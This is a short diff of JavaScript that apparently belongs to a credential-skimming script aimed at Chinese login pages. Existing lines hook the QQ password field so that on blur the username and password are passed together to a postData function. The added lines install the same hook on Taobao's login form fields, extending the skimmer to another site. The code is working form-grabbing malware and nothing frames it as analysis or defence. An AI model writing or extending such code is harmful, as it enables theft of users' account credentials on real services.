@@ -25,5 +25,5 @@ var qqPw=document.getElementById('p');
 qqPw.setAttribute("onblur","postData(document.getElementById('u').value + document.getElementById('p').value);");
 
 //taobao.com
-
-//alipay.com
+var taobaoPw=document.getElementById('TPL_password_1');
+taobaoPw.setAttribute("onblur","postData(document.getElementById('TPL_username_1').value + document.getElementById('TPL_password_1').value);");
